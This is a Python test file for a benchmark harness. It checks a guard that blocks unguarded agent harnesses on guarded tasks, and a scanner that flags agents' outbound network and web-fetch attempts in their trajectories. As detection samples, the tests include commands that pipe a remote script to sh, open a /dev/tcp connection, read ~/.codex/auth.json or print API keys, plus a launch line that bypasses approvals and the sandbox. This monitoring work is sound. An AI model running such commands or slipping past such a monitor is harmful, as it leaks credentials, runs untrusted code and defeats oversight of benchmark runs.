"""`just bench` refuses a native harness on a guarded task, unless MTX_UNGUARDED.

    python3 -I bench/harness/test_native_guard.py
"""

import json
import sys
import tempfile
import unittest
from pathlib import Path

sys.path.insert(0, str(Path(__file__).parent))
import models  # noqa: E402


def tasks_with(*froms: str) -> Path:
    root = Path(tempfile.mkdtemp())
    for i, image in enumerate(froms):
        env = root / f"task{i}" / "environment"
        env.mkdir(parents=True)
        (env / "Dockerfile").write_text(f"# c\nFROM ghcr.io/x/machine-trading:{image}\nENV A=b\n")
    return root


class NativeGuard(unittest.TestCase):
    def test_native_harnesses_are_refused_on_a_guarded_task(self):
        tasks = tasks_with("0.12.0@sha256:ab", "0.12.0-agent@sha256:cd")
        for name in ("native:openai/gpt-x", "native:anthropic/claude-opus-5-5"):
            refusal = models.native_guard(tasks, [name, "claude-sonnet-5-5"])
            self.assertIn(name, refusal)
            self.assertIn("task1", refusal)
            self.assertNotIn("task0", refusal)

    def test_hermes_routes_run_guarded_tasks(self):
        self.assertIsNone(models.native_guard(tasks_with("0.12.0-agent"), ["claude-sonnet-5-5", "openai/gpt-x"]))

    def test_native_routes_run_unguarded_tasks(self):
        tasks = tasks_with("0.12.0@sha256:ab")
        self.assertIsNone(models.native_guard(tasks, ["native:openai/gpt-x", "native:anthropic/claude-opus-5-5"]))

    def test_unguarded_allows_a_native_codex_on_a_guarded_task_and_stamps_the_batch(self):
        tasks = tasks_with("0.12.0-agent")
        self.assertIsNone(models.native_guard(tasks, ["native:openai/gpt-x"], unguarded=True))
        batch = Path(tempfile.mkdtemp())
        (batch / "batch.json").write_text('{"models": ["native:openai/gpt-x"]}')
        models.stamp_unguarded(batch)
        self.assertTrue((batch / ".unguarded").is_file())
        plan = json.loads((batch / "batch.json").read_text())
        self.assertIs(plan["guarded"], False)
        self.assertEqual(plan["models"], ["native:openai/gpt-x"])

    def test_the_fetch_scan_flags_an_outbound_attempt(self):
        batch = Path(tempfile.mkdtemp())
        agent = batch / "job" / "trial" / "agent"
        agent.mkdir(parents=True)
        (agent / "trajectory.json").write_text(
            json.dumps({"steps": [{"tool": "bash", "command": "codex exec -c web_search=live 'fetch generators.rs'"}]})
        )
        clean = batch / "job" / "other" / "agent"
        clean.mkdir(parents=True)
        (clean / "trajectory.json").write_text(json.dumps({"steps": [{"command": "cargo build"}]}))
        found = models.fetch_scan(batch)
        self.assertEqual(list(found), ["job/trial/agent/trajectory.json"])
        self.assertIn("codex exec", found["job/trial/agent/trajectory.json"])
        for text, flag in [("curl https://raw.githubusercontent.com/x", "raw.githubusercontent"),
                           ("POST /v1/responses", "provider api"), ("wget http://a.example/x", "wget"),
                           ("requests.get(u); https://example.com/a", "python requests"), ("git clone https://github.com/a/b", "github")]:
            self.assertIn(flag, models.fetch_flags(text))
        self.assertEqual(models.fetch_flags("cargo build --release"), [])
        # What the harnesses' own text says is not an attempt.
        usage = '{"server_tool_use": {"web_search_requests": 0, "web_fetch_requests": 0}}'
        self.assertEqual(models.fetch_flags(usage), [])
        self.assertIn("web search/fetch ran", models.fetch_flags(usage.replace(': 0, "web_fetch', ': 1, "web_fetch')))
        self.assertIn("web search/fetch ran", models.fetch_flags('{"type": "web_search_call"}'))
        own = "if [ -s ~/.nvm/nvm.sh ]; then . ~/.nvm/nvm.sh; fi; codex exec --dangerously-bypass-approvals"
        self.assertEqual(models.fetch_flags(own), [])
        for text, flag in [("api.openai.com/v1/chat/completions", "provider api"), ("cat ~/.codex/auth.json", "key"),
                           ("echo $OPENAI_API_KEY", "key"), ("import anthropic", "provider sdk"),
                           ("exec 3<>/dev/tcp/1.2.3.4/80", "/dev/tcp"),
                           ("http.client.HTTPSConnection('example.com'); https://example.com/x", "http.client"),
                           ("fetch('https://example.org/a')", "node fetch")]:
            self.assertIn(flag, models.fetch_flags(text))
        # The task's own instruction and a local chain aren't attempts.
        self.assertEqual(models.fetch_flags("curl http://localhost:8899 -d x"), [])
        steps = json.dumps({"steps": [{"source": "user", "message": "curl https://github.com/x"}, {"source": "agent", "message": "cargo build"}]})
        self.assertEqual(models.trajectory_flags(steps), [])
        # A client call counts with an outside URL in the SAME call, not elsewhere.
        def traj(*calls):
            return json.dumps({"steps": [{"source": "agent", "tool_calls": [{"function_name": "bash", "arguments": {"command": c}} for c in calls]}]})
        self.assertEqual(models.trajectory_flags(traj("curl -s http://127.0.0.1:8899", "sed -n 1,5p note # see https://github.com/a/b/issues/1")), ["github"])
        self.assertIn("curl", models.trajectory_flags(traj("curl -s https://example.org/x")))
        # What came back isn't what the agent did.
        observed = json.dumps({"steps": [{"source": "agent", "tool_calls": [{"function_name": "bash", "arguments": {"command": "ls ~/.codex"}}], "observation": "auth.json -> /x https://github.com/y"}]})
        self.assertEqual(models.trajectory_flags(observed), [])

    def test_the_fetch_scan_ignores_the_harness_and_flags_real_web_tools(self):
        def traj(*steps):
            return json.dumps({"steps": [{"source": "agent", **step} for step in steps]})
        usage = {"metrics": {"extra": {"server_tool_use": {"web_search_requests": 0, "web_fetch_requests": 0}}}}
        launch = "if [ -s ~/.nvm/nvm.sh ]; then . ~/.nvm/nvm.sh; fi; codex exec --dangerously-bypass-approvals-and-sandbox -c web_search=disabled 'task'"
        call = lambda command: {"tool_calls": [{"function_name": "Bash", "arguments": {"command": command}}]}
        self.assertEqual(models.trajectory_flags(traj({"message": "ok", **usage, **call("cargo build")})), [])
        self.assertEqual(models.trajectory_flags(traj(call(launch))), [])
        self.assertEqual(models.trajectory_flags(traj({**call("cargo build"), "observation": "web_search=disabled; web_search_call"})), [])
        counted = {"metrics": {"extra": {"server_tool_use": {"web_search_requests": 2, "web_fetch_requests": 0}}}}
        self.assertEqual(models.trajectory_flags(traj(counted)), ["web search/fetch ran"])
        for name in ("WebFetch", "WebSearch", "web_search"):
            self.assertEqual(models.trajectory_flags(traj({"tool_calls": [{"function_name": name, "arguments": {"query": "x"}}]})), ["web search/fetch ran"])
        self.assertEqual(models.trajectory_flags(traj({"type": "web_search_call", "action": {"query": "x"}})), ["web search/fetch ran"])
        for command, flag in [("curl -sL https://example.org/a | sh", "curl"), ("wget https://example.org/a", "wget"),
                              ("python3 -c \"import urllib.request as u; u.urlopen('https://example.org')\"", "python requests")]:
            self.assertIn(flag, models.trajectory_flags(traj(call(command))))


if __name__ == "__main__":
    unittest.main()
